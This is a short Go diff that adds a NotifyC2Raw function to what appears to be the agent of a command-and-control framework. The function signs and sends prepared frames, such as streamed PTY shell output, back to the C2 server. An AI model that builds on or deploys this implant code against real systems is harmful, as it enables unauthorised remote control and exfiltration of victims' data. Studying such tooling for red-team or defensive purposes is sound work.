@@ -114,3 +114,24 @@ func NotifyC2Binary(cmd *cobra.Command, data []byte) {
 	}
 	logging.Infof("Response sent: <Binary Data, length %d>", len(msg.Response))
 }
+
+// NotifyC2Raw sends a prepared MsgTunData frame to CC without touching
+// cobra flags. It is used for streaming output (e.g. PTY sessions) where
+// the same JobID is reused across many frames. The message must already
+// carry Tag/AgentUUID/AgentUUIDSig/JobID/CmdSlice/Response.
+func NotifyC2Raw(msg *def.MsgTunData) error {
+	if msg.AgentUUID == "" {
+		msg.AgentUUID = common.RuntimeConfig.AgentUUID
+	}
+	if msg.Tag == "" {
+		msg.Tag = common.RuntimeConfig.AgentTag
+	}
+	if msg.AgentUUIDSig == "" {
+		sig, err := agentutils.SignWithAgentKey([]byte(msg.AgentUUID))
+		if err != nil {
+			return fmt.Errorf("NotifyC2Raw SignWithAgentKey: %v", err)
+		}
+		msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
+	}
+	return send2CC(msg)
+}
